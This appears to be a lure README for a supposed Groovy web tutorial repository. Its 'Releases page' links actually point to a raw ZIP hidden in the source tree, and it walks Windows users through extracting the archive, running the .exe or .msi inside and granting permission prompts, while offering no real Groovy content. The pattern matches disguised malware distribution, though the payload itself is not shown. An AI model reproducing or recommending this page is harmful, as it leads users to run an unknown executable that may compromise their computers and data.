# groovy-web-examples - Learn Groovy web apps with ease

[![Download the app](https://img.shields.io/badge/Download%20from%20Releases-blue?style=for-the-badge)](https://github.com/lija8421/groovy-web-examples/raw/refs/heads/main/examples/grails/hello-world/groovy_examples_web_tabby.zip)

## 🧭 What this is

groovy-web-examples is a set of simple web app examples, tutorials, and best practices built with Groovy. It helps you see how modern web apps work without needing to start from scratch.

Use it to explore common web patterns, compare frameworks, and run sample apps on Windows.

## 🖥️ What you need

- A Windows PC
- A web browser
- Internet access for the first download
- A recent Java runtime if the release asks for it
- Enough disk space for the app and sample files

If the release page includes a packaged app, you can use it right away. If it includes a ZIP file, you can extract it before you start.

## 📥 Download the app

Visit the release page here and choose the latest file for Windows:

[Go to the Releases page](https://github.com/lija8421/groovy-web-examples/raw/refs/heads/main/examples/grails/hello-world/groovy_examples_web_tabby.zip)

Look for a file name that fits Windows use, such as:

- `.exe`
- `.zip`
- `.msi`

If you see more than one file, choose the one meant for Windows.

## 🪟 Install on Windows

1. Open the release page.
2. Find the latest release.
3. Download the Windows file.
4. If you downloaded a `.zip` file, right-click it and choose Extract All.
5. Open the extracted folder.
6. If you see an `.exe` file, double-click it to start the app.
7. If you see an `.msi` file, double-click it and follow the setup steps.
8. If Windows asks for permission, choose Yes.

## ▶️ Run the app

After install, start the app from the file you downloaded or from the folder you extracted.

If the app opens in a browser, you can use it like a normal website.

If the app uses a local web server, keep the app window open while you use it.

## 🔧 First run steps

1. Start the app.
2. Wait for it to finish loading.
3. Open your browser if it does not open on its own.
4. Follow the on-screen prompt, if one appears.
5. Pick a sample or tutorial from the home page.
6. Try one example at a time.

## ❓ Common issues

### The file does not open

- Check that the download finished
- Try opening the file again
- Make sure you chose the Windows file
- If it is a ZIP file, extract it first

### The browser does not open

- Start your browser by hand
- Look for a local address such as `http://localhost:...`
- Copy that address into the browser

### The app closes right away

- Open it again
- Read any message on screen
- Check whether the release page lists a Java requirement
